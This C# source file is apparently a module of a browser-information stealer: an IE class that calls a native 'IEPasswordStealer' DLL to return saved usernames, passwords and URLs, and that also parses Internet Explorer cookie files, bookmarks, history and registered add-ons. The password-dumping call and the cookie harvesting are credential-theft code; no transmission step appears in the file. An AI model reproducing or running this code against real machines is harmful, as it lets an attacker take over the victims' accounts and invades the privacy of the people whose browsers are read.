using Microsoft.Win32;
using Module_Browser_Info.IE.IEAPI;
using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace Module_Browser_Info.IE
{
    /// <summary>
    /// get infromation from ie
    /// </summary>
    public class IE
    {
        /// <summary>
        /// Gets the ie password from DLL.
        /// </summary>
        /// <returns>return string from _s_Module_Browser_Info_IEPasswordStealer.dll contain user pass saved on ie</returns>
        [DllImport("_s_Module_Browser_Info_IEPasswordStealer.dll", CallingConvention = CallingConvention.Cdecl)]
        [return: MarshalAs(UnmanagedType.BStr)]
        /// <summary>
        /// Gets the ie password.
        /// </summary>
        /// <returns>call GetIEPasswordFromDLL from _s_Module_Browser_Info_IEPasswordStealer and return string data</returns>
        static extern string GetIEPasswordFromDLL();
        /// <summary>
        /// Called when [get ie password].
        /// </summary>
        /// <returns>call GetIEPasswordFromDLL from _s_Module_Browser_Info_IEPasswordStealer and return string data</returns>
        public static string OnGetIEPassword()
        {
            string Usernames_Passwords_Urls = GetIEPasswordFromDLL();
            return Usernames_Passwords_Urls;
        }


        /// <summary>
        /// Gets the ie addon list.
        /// </summary>
        /// <returns>get string list of ie addons</returns>
        public static List<string> OnGetIEAddonList()
        {
            List<string> AdodonsList = new List<string>();
            //Open the HKEY_CLASSES_ROOT\CLSID which contains the list of all registered COM files (.ocx,.dll, .ax) 
            //on the system no matters if is 32 or 64 bits.
            RegistryKey t_clsidKey = Registry.ClassesRoot.OpenSubKey("CLSID");

            //Get all the sub keys it contains, wich are the generated GUID of each COM.

            foreach (object subKey_loopVariable in t_clsidKey.GetSubKeyNames().ToList())
            {


                object subKey = subKey_loopVariable;
                //For each CLSID\GUID key we get the InProcServer32 sub-key .
                RegistryKey t_clsidSubKey = Registry.ClassesRoot.OpenSubKey("CLSID\\" + subKey + "\\Implemented Categories\\{00021493-0000-0000-C000-000000000046}");


                if ((t_clsidSubKey != null))
                {
                    RegistryKey CLSID_IE_Addon = Registry.ClassesRoot.OpenSubKey("CLSID\\" + subKey);
                    string[] ValueNames= CLSID_IE_Addon.GetValueNames();
                    if(ValueNames.Length>0)
                    {
                       string AddonName= CLSID_IE_Addon.GetValue(ValueNames[0]).ToString();
                        AdodonsList.Add(AddonName);
                    }


                }

            }
            return AdodonsList;
        }

        /// <summary>
        /// Gets the ie cookies.
        /// </summary>
        ///ie cookie format
        ///Cookie name
        ///Cookie value
        ///Host/path for the web server setting the cookie
        ///Flags
        ///Exirpation time(low)
        ///Expiration time(high)
        ///Creation time(low)
        ///Creation time(high)
        ///Record delimiter(*)
        /// <returns>get the list of ie cookies</returns>
        public static List<BrowserCookie_Node> OnGetIECookies()
        {
            List<BrowserCookie_Node> Cookies = new List<BrowserCookie_Node>();

            string Value = string.Empty;
            bool fRtn = false;
            string strPath, strCookie;
            string[] fp;
            StreamReader r;
            int idx;

                strPath = Environment.GetFolderPath(Environment.SpecialFolder.Cookies);
                Version v = Environment.OSVersion.Version;

                if (IsWindows7())
                {
                    strPath += @"\low";
                }

                fp = Directory.GetFiles(strPath, "*.txt");

                foreach (string path in fp)
                {
                    r = File.OpenText(path);
                FileInfo fileinf = new FileInfo(path); 
                    strCookie = r.ReadToEnd();
                    r.Close();
                string[] SplitedCookieDataByStart = strCookie.Split("*".ToCharArray(),StringSplitOptions.RemoveEmptyEntries);
                foreach(string OneFullCookie in SplitedCookieDataByStart)
                {
                    string[] SplitedOneCookieToLines = OneFullCookie.Split("\n".ToCharArray(), StringSplitOptions.RemoveEmptyEntries);
                    if(SplitedOneCookieToLines.Length>7)
                    {
                        BrowserCookie_Node cookienode = new BrowserCookie_Node();
                        cookienode.name = SplitedOneCookieToLines[0];
                        cookienode.value = SplitedOneCookieToLines[1];
                        cookienode.baseDomain = SplitedOneCookieToLines[2];
                        cookienode.lastAccessed = fileinf.LastAccessTime;
                        FILETIME ft = new FILETIME();
                        ft.dwLowDateTime =(int)long.Parse(SplitedOneCookieToLines[4]);
                        ft.dwHighDateTime=(int)long.Parse(SplitedOneCookieToLines[5]);
                        cookienode.expiry = FILETIMEToLong(ft);
                        ft.dwLowDateTime = (int)long.Parse(SplitedOneCookieToLines[6]);
                        ft.dwHighDateTime = (int)long.Parse(SplitedOneCookieToLines[7]);
                        cookienode.creationTime = FILETIMEToLong(ft);
                        Cookies.Add(cookienode);
                    }
                }
            }
            return Cookies;
        }

        /// <summary>
        /// Determines whether this instance is windows7.
        /// </summary>
        /// <returns>
        ///   <c>true</c> if this instance is windows7; otherwise, <c>false</c>.
        ///   because in windows 7 the ie cookie folder is diffrent
        /// </returns>
        private static bool IsWindows7()
        {
            OperatingSystem osVersion = Environment.OSVersion;

            return (osVersion.Platform == PlatformID.Win32NT) &&
                (osVersion.Version.Major == 6) &&
                (osVersion.Version.Minor == 1);
        }
        /// <summary>
        /// Gets the ie bookmarks.
        /// </summary>
        /// <returns>get the list of ie bookmark</returns>
        public static List<BrowserHistory_Node> OnGetIEBookmarks()
        {
            List<BrowserHistory_Node> URLs = new List<BrowserHistory_Node>();

         string _favouritesPath = string.Empty;

         string _currentDirectory = string.Empty;
         string _fileName = string.Empty;
                _favouritesPath = Environment.GetFolderPath(Environment.SpecialFolder.Favorites);
                if (!string.IsNullOrEmpty(_favouritesPath))
                {
                    DirectoryInfo di = new DirectoryInfo(_favouritesPath);
                    _currentDirectory = Environment.CurrentDirectory;
                    if (di != null)
                    {
                        FileInfo[] _files = di.GetFiles("*.url", SearchOption.AllDirectories);
                        if (_files != null && _files.Length > 0)
                        {
                            foreach (FileInfo _file in _files)
                            {
                                if (_file.Exists)
                                {
                                    _fileName = _file.Name.Split('.').FirstOrDefault().ToString();
                                    StreamReader _reader = _file.OpenText();
                                    string _allContents = _reader.ReadToEnd();
                                    string[] _splits = _allContents.Split(new char[] { '=', '[' }, StringSplitOptions.RemoveEmptyEntries);
                                    if (_splits.Length > 0 && !string.IsNullOrEmpty(_splits[1]))
                                    {
                                    BrowserHistory_Node bookmarknode = new BrowserHistory_Node();
                                        for(int i=0;i<_splits.Length;i++)
                                        {
                                            if(_splits[i]== "\r\nURL")
                                            {
                                                bookmarknode.url = _splits[i + 1];
                                                bookmarknode.title = _fileName;
                                                bookmarknode.lastvisit = _file.LastAccessTime;
                                                bookmarknode.create = _file.CreationTime;
                                                URLs.Add(bookmarknode);
                                            }
                                        }                                  
                                    }
                                }
                            }
                        }
                    }
                }

            return URLs;
        }
        /// <summary>
        /// Gets the ie history.
        /// </summary>
        /// <returns>get list of ie histroy</returns>
        public static List<BrowserHistory_Node> OnGetIEHistory()
        {
            List<BrowserHistory_Node> URLs = new List<BrowserHistory_Node>();
            UrlHistoryWrapperClass.STATURLEnumerator enumerator;
            UrlHistoryWrapperClass urlHistory;
            urlHistory = new UrlHistoryWrapperClass();
            enumerator = urlHistory.GetEnumerator();


            while (enumerator.MoveNext())
            {
                BrowserHistory_Node HistoryNode = new BrowserHistory_Node();
                if(enumerator.Current.URL!=null)
                HistoryNode.url = enumerator.Current.URL.ToString();
                if(enumerator.Current.Title!=null)
                HistoryNode.title= enumerator.Current.Title.ToString();
                HistoryNode.create =FILETIMEToLong(enumerator.Current.ftLastUpdated);
                HistoryNode.lastvisit= FILETIMEToLong(enumerator.Current.ftLastVisited);
                URLs.Add(HistoryNode);
            }
            enumerator.Reset();


            return URLs;
        }

        /// <summary>
        /// Filetimes to long.
        /// </summary>
        /// <param name="ft">The ft.</param>
        /// <returns>the file time is important for microsoft ie history because create time of history is create time of that file</returns>
        private static DateTime FILETIMEToLong(System.Runtime.InteropServices.FILETIME ft)
        {
            try { 
            ulong high = (ulong)ft.dwHighDateTime;
            uint low = (uint)ft.dwLowDateTime;
            long fileTime = (long)((high << 32) + low);
                return DateTime.FromFileTimeUtc(fileTime);
            }
            catch (Exception ex)
            {
                var epoch = new DateTime(1, 1, 1, 0, 0, 0, DateTimeKind.Utc);
                return epoch;
            }
        }

    }
}
